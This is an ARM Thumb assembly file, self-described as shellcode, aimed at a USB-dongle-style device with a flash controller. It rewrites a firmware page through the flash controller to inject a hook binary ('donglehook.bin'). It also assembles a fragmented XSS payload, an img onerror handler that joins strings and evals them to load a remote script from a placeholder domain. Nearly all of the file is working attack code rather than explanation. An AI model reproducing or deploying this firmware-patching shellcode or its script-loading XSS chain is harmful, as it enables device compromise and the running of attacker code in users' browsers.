.nds

.create "flash.bin",0x0

.thumb

; define some constants
NVMC equ 0x4001E000
NVMC_READY equ (NVMC + 0x400) ; Ready flag
NVMC_CONFIG equ (NVMC + 0x504) ; Configuration register
NVMC_ERASEPAGE equ (NVMC + 0x508) ; Register for erasing a page in Code area

; ; d105
; MOD_PAGE equ 0x0001EC00
; MOD_OFFSET equ 0x54

; d1071
; MOD_PAGE equ 0x0001EC00
; MOD_OFFSET equ 0x80
MOD_PAGE equ 0x0001E000
MOD_OFFSET equ 0x3AC

MOD_LENGTH equ (mod_data_end - mod_data_start)
SCRATCH_PAGE equ 0x00038000

functable:
	.halfword main
	.halfword nvmc_page_erase
	.halfword nvmc_write

; shellcode main function
main:
	push {lr}

	.halfword 0xB672 ; cpsid i

	; generate our html payload and put it in flash
	bl generate_html_payload

	; first erase unused page of flash (so we can copy stuff to it)
	ldr r0, =SCRATCH_PAGE
	bl nvmc_page_erase

	; then copy our target page to last page of flash
	ldr r0, =SCRATCH_PAGE
	ldr r1, =MOD_PAGE
	ldr r2, =0x400
	bl nvmc_write

	; now erase target page
	ldr r0, =MOD_PAGE
	bl nvmc_page_erase

	; at this point we can start copying the original page up to our modifications...
	ldr r0, =MOD_PAGE
	ldr r1, =SCRATCH_PAGE
	ldr r2, =MOD_OFFSET
	bl nvmc_write

	; ...then our modifications...
	ldr r0, =(MOD_PAGE + MOD_OFFSET)
	add r1, =mod_data_start
	ldr r2, =MOD_LENGTH
	bl nvmc_write

	; ...then the rest of the original page
	ldr r0, =(MOD_PAGE + MOD_OFFSET + MOD_LENGTH)
	ldr r1, =(SCRATCH_PAGE + MOD_OFFSET + MOD_LENGTH)
	ldr r2, =(0x400 - MOD_OFFSET - MOD_LENGTH)
	bl nvmc_write

	.halfword 0xB662 ; cpsie i

	; and we're done!
	pop {pc}

; assumes html_init_line has been initialized
.macro write_html_line
	mov r0, r4
	add r1, =html_init_line
	mov r2, #0x20
	add r4, r2
	bl nvmc_write
.endmacro

; copies partial line from r1 to html_init_line
.macro write_partial_line
	add r0, =(html_init_line + 20)
	mov r2, #12
	bl memcpy
	write_html_line
.endmacro

generate_html_payload:
	push {r4-r7,lr}
	
	; gonna keep r4 as the cursor for the output
	ldr r4, =0x36000

	; shouldn't need to erase anything, those pages should already be clear

	add r1, =html_init_line
	write_html_line

	bl write_html_delay

	add r0, =(html_init_line + 20)
	add r1, =html_contents_line
	mov r2, #12
	bl memcpy

	; r5 = index within xss_payload (divided by 2)
	mov r5, #0
	; r6 = address of xss_payload
	add r6, =xss_payload
	; r7 = pointer to (html_init_line + 20)
	add r7, =(html_init_line + 20)
	generate_html_payload_loop:
		; set the array index
		mov r0, r5
		mov r1, #0x20
		cmp r0, #10
		blt index_loop_skip
		mov r1, #0x30
		index_loop:
			sub r0, #10
			add r1, #1
			cmp r0, #10
			bge index_loop
		index_loop_skip:
		add r0, #0x30
		strb r0, [r7, #3]
		strb r1, [r7, #2]

		; set the array element contents
		lsl r1, r5, #1
		add r1, r6
		ldrb r0, [r1]
		strb r0, [r7, #7]
		ldrb r0, [r1, #1]
		strb r0, [r7, #8]

		write_html_line

		add r5, #1
		cmp r5, #((xss_payload_end - xss_payload) / 2)
		bne generate_html_payload_loop

	bl write_html_delay

	add r1, =html_join_line_1
	write_partial_line

	bl write_html_delay

	add r1, =html_join_line_2
	write_partial_line

	bl write_html_delay

	add r1, =html_eval_line
	write_partial_line


	pop {r4-r7,pc}

write_html_delay:
	push {r5,lr}

	mov r5, #0x10
	write_html_delay_loop:
		add r1, =html_delay_line
		write_partial_line
		sub r5, #1
		bne write_html_delay_loop

	pop {r5,pc}

; usual parameters
; don't pass 0-length though or you'll have an unhappy time
memcpy:
	memcpy_loop:
		sub r2, #1
		ldrb r3, [r1, r2]
		strb r3, [r0, r2]
		cmp r2, #0
		bne memcpy_loop
	bx lr

.align 4
html_init_line:
	.ascii "<img src=a onerror='z=[];'>     "
.align 4
html_delay_line:
	.ascii "'>          "
.align 4
html_contents_line:
	.ascii "z[  ]=\"  \"'>"
.align 4
html_join_line_1:
	.ascii "z.z=z.join'>"
.align 4
html_join_line_2:
	.ascii "z=z.z(\"\")'> "
.align 4
html_eval_line:
	.ascii "eval(z)'>  "
	.byte 0
.align 4
; length must be multiple of 2
; escape characters must be 2-aligned
xss_payload:
	.ascii "var x=document.createElement( \\\"script\\\");x.src=\\\"https://insertdomainnamehere/t.js \\\";document.head.appendChild(x);"
xss_payload_end:

.align 2
; nvmc helper functions
	; no parameters
	; for convenience, preserves all registers
	nvmc_wait_ready:
		push {r0,r1,lr}
		ldr r0, =NVMC_READY
		nvmc_wait_ready_loop:
			ldr r1, [r0]
			cmp r1, 1
			bne nvmc_wait_ready_loop
		pop {r0,r1,pc}

	; r0: page address
	nvmc_page_erase:
		push {lr}

		; set NVMC_CONFIG to allow erasing
		ldr r3, =NVMC_CONFIG
		mov r2, #2 ; WEN_Een
		str r2, [r3]

		; wait for operation to be done
		bl nvmc_wait_ready

		; set which page to erase
		str r0, [r3, #NVMC_ERASEPAGE - NVMC_CONFIG]

		; wait for operation to be done
		bl nvmc_wait_ready

		; reset config to read-only
		; (we may be able to remove this since we'll be going to write mode afterwards anyway)
		mov r2, #0 ; WEN_Ren
		str r2, [r3]

		; wait for operation to be done
		pop {lr}
		b nvmc_wait_ready

	; r0: target address
	; r1: source data
	; r2: source data length (MUST be multiple of 4)
	nvmc_write:
		push {r4,lr}
		
		; set NVMC_CONFIG to allow erasing
		ldr r4, =NVMC_CONFIG
		mov r3, #1 ; WEN_Wen
		str r3, [r4]

		; wait for operation to be done
		bl nvmc_wait_ready

		nvmc_write_loop:
			sub r2, #4
			; write words
			ldr r3, [r1, r2]
			str r3, [r0, r2]
			; wait for operation to be done
			bl nvmc_wait_ready
			cmp r2, #0
			bne nvmc_write_loop

		; reset config to read-only
		mov r3, #0 ; WEN_Ren
		str r3, [r4]

		; wait for operation to be done
		pop {r4,lr}
		b nvmc_wait_ready

.pool

.align 4
mod_data_start:
	.incbin "donglehook.bin"
mod_data_end:

.Close
